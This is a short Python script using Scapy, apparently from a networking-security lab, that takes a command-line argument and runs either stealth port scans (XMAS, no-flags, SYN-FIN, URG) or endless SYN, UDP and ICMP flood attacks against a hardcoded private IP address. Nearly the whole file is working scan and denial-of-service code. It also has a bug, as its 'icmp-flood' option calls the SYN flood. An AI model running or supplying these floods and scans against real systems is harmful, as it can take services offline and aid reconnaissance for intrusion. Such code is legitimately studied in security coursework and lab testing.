#https://www.uv.mx/personal/angelperez/files/2018/10/scanning_texto.pdf
from scapy.all import *

ip = "192.168.210.162"
openp = []
filteredp = []
common_ports = {80, 21, 22, 23, 25}
common_ports2 = { 21, 22, 23, 25, 53, 69, 80, 88, 109, 110,
123, 137, 138, 139, 143, 156, 161, 389, 443,
445, 500, 546, 547, 587, 660, 995, 993, 2086,
2087, 2082, 2083, 3306, 8443, 10000
}

def parser():
	attack = sys.argv[1]
	
	# Recon attacks:
	if attack == 'xmas':
		xmas_recon();
	elif attack == 'no-flags':
		no_flags_recon();
	elif attack == 'syn-fin':
		syn_fin_recon();
	elif attack == 'urg':
		urg_recon();
	
	# DoS attacks:
	elif attack == 'udp-flood':
		udp_flood_attack();
	elif attack == 'syn-flood':
		syn_flood_attack();
	elif attack == 'icmp-flood':
		syn_flood_attack();

# Recon attacks:
def xmas_recon():
	for dst_port in common_ports:
		src_port = RandShort()
		p = IP(dst=ip)/TCP(sport=src_port, dport=dst_port, flags='FPU')
		resp = sr1(p,timeout=3) # Sending packet

		# No response => port is open
		if str(type(resp))=="<type 'NoneType'>":
			print('---> Port ' + str(dst_port) + ' is OPEN / FILTERED.\n')
		elif resp.haslayer(TCP):
			if resp.getlayer(TCP).flags == 0x14:
				print('---> Port ' + str(dst_port) + ' is CLOSED.\n')
		elif resp.getlayer(ICMP).code in [1,2,3,9,10,13]:
			print('Filtered.')

def syn_fin_recon():
	packet = IP(dst=ip) / TCP(flags="SF")
	sr(packet)

def no_flags_recon():
	packet = IP(dst=ip) / TCP(flags="")
	send(packet)

def urg_recon():
	packet = IP(dst=ip) / TCP(flags="U", dport=139)
	send(packet) 

# DoS attacks:
def syn_flood_attack():
	packet = IP(dst=ip) / TCP(dport=139, flags="S")
	send(packet, loop=1, inter=0.005)

def udp_flood_attack():
	packet = IP(dst=ip) / UDP(dport=20) / ("X" * RandByte()) 
	send(packet, loop=1, inter=0.005)

def icmp_flood_attack():
	packet = IP(dst=ip) / ICMP() / "1234567890"
	send(packet, loop=1, inter=0.005) 


parser();
